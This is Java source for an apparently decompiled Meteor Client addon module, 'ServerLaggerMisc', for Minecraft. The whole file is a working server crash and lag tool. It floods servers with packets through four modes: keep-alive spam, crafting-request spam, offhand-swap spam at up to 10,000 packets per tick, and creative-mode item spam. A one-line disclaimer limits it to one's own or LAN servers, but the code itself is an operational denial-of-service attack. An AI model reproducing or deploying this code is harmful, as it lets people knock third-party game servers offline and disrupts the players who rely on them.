package com.codigohasta.addon.modules;

import com.codigohasta.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent.Receive;
import meteordevelopment.meteorclient.events.world.TickEvent.Pre;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.EnumSetting.Builder;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.OnGroundOnly;
import net.minecraft.network.packet.s2c.common.KeepAliveS2CPacket;
import net.minecraft.recipe.NetworkRecipeId;
import net.minecraft.screen.CraftingScreenHandler;
import net.minecraft.screen.sync.ItemStackHash;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class ServerLaggerMisc extends Module {
   private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
   private final Setting<ServerLaggerMisc.Mode> mode = this.sgGeneral
      .add(
         ((Builder)((Builder)((Builder)new Builder().name("mode")).description("Which misc crash / lag method to use."))
               .defaultValue(ServerLaggerMisc.Mode.CONSOLE))
            .build()
      );
   private final Setting<Integer> offhandPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("offhand-packets"))
                     .description("Packets per tick for the offhand-spam mode."))
                  .defaultValue(1000))
               .min(1)
               .max(10000)
               .sliderMin(1)
               .sliderMax(10000)
               .visible(() -> this.mode.get() == ServerLaggerMisc.Mode.OffhandSpam))
            .build()
      );
   private final Setting<Integer> creativePackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("creative-packets"))
                     .description("Packets per tick for the creative-packet mode."))
                  .defaultValue(15))
               .min(1)
               .max(100)
               .sliderMin(1)
               .sliderMax(100)
               .visible(() -> this.mode.get() == ServerLaggerMisc.Mode.CreativePacket))
            .build()
      );
   private final Setting<Integer> craftPackets = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                        .name("craft-packets"))
                     .description("Packets per tick for the crafting mode."))
                  .defaultValue(3))
               .min(1)
               .max(100)
               .sliderMin(1)
               .sliderMax(100)
               .visible(() -> this.mode.get() == ServerLaggerMisc.Mode.Crafting))
            .build()
      );
   private final Setting<Boolean> autoDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("auto-disable"))
                  .description("Disable the module when you join or leave a world."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Boolean> smartDisable = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)((meteordevelopment.meteorclient.settings.BoolSetting.Builder)new meteordevelopment.meteorclient.settings.BoolSetting.Builder()
                     .name("smart-disable"))
                  .description("Automatically disable the module when a mode finishes or errors out."))
               .defaultValue(true))
            .build()
      );
   private final Setting<Integer> delay = this.sgGeneral
      .add(
         ((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)((meteordevelopment.meteorclient.settings.IntSetting.Builder)new meteordevelopment.meteorclient.settings.IntSetting.Builder()
                     .name("delay"))
                  .description("Ticks to wait between bursts of packets."))
               .defaultValue(1))
            .min(0)
            .max(100)
            .sliderMin(0)
            .sliderMax(100)
            .build()
      );
   private long keepAliveId;
   private int ticks = 0;

   public ServerLaggerMisc() {
      super(
         AddonTemplate.OP_CATEGORY,
         "ServerLaggerMisc",
         "Miscel laneous crash vectors: keep-alive flood, crafting-tick abuse, offhand swap spam, creative-mode item spam. Testing on your own / LAN servers only."
      );
   }

   @EventHandler
   private void onTick(Pre event) {
      if (this.mc.player != null && this.mc.world != null) {
         this.ticks++;
         if (this.ticks > (Integer)this.delay.get()) {
            this.ticks = 0;
            switch ((ServerLaggerMisc.Mode)this.mode.get()) {
               case CONSOLE:
                  for (int i = 0; i < 5; i++) {
                     KeepAliveC2SPacket packet = new KeepAliveC2SPacket(this.keepAliveId++);

                     try {
                        this.mc.getNetworkHandler().sendPacket(packet);
                     } catch (Exception var5) {
                        var5.printStackTrace();
                     }
                  }
                  break;
               case Crafting:
                  if (!(this.mc.player.currentScreenHandler instanceof CraftingScreenHandler) || this.mc.getNetworkHandler() == null) {
                     return;
                  }

                  try {
                     for (int i = 0; i < this.craftPackets.get(); i++) {
                        this.mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(this.mc.player.currentScreenHandler.syncId, new NetworkRecipeId(i), true));
                     }
                  } catch (Exception var6) {
                     ChatUtils.sendPlayerMsg("§4[!] " + var6.getMessage());
                     var6.printStackTrace();
                     if ((Boolean)this.smartDisable.get()) {
                        this.disable();
                     }
                  }
                  break;
               case CreativePacket:
                  if (!this.mc.player.getAbilities().creativeMode) {
                     if ((Boolean)this.smartDisable.get()) {
                        this.disable();
                     }

                     return;
                  }

                  for (int i = 0; i < this.creativePackets.get(); i++) {
                     this.mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, new ItemStack(Items.CAMPFIRE)));
                  }
                  break;
               case OffhandSpam:
                  for (int index = 0; index < this.offhandPackets.get(); index++) {
                     this.mc.getNetworkHandler().sendPacket(new PlayerActionC2SPacket(Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
                     this.mc.getNetworkHandler().sendPacket(new OnGroundOnly(true, false));
                  }
            }
         }
      } else {
         if ((Boolean)this.autoDisable.get()) {
            this.disable();
         }
      }
   }

   @EventHandler
   private void onPacketReceive(Receive event) {
      if (this.mc.player != null && this.mc.world != null) {
         if (event.packet instanceof KeepAliveS2CPacket packet) {
            this.keepAliveId = packet.getId();
         }
      }
   }

   @EventHandler
   private void onGameJoined(GameJoinedEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   @EventHandler
   private void onGameLeft(GameLeftEvent event) {
      if ((Boolean)this.autoDisable.get()) {
         this.disable();
      }
   }

   private static ItemStackHash hashOf(ItemStack stack) {
      return ItemStackHash.fromItemStack(stack, c -> 0);
   }

   public void onDeactivate() {
      this.ticks = 999;
   }

   public static enum Mode {
      CONSOLE,
      Crafting,
      CreativePacket,
      OffhandSpam;
   }
}
